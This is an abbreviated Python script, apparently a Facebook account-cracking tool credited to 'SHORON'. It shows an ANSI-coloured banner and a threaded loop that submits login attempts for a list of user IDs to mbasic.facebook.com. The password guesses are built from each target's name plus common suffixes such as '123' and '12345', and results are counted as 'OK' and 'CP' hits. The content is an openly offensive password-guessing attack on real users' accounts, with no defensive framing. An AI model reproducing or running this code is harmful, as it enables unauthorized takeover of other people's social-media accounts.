...
from concurrent.futures import ThreadPoolExecutor as sarfrazSHORON
...
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬜⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬜⬜⬜⬜
                                                            \x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m SHORON
\033[1;31m\033[1;37m Facebook\x1b[1;97m :  \033[1;37mANONYMOUS
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m TEAM_SHORON_PK 
...
def hasil(ok,cp):
	...
	print(f' OK : %s '%(ok))
	print(f' CP : %s '%(cp))
	input('Press enter to back SHORON Menu ')
	sarfraz()
...
class __xxx__:
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with sarfrazSHORON(max_workers=30) as SHORONworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234"]
                        SHORONworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
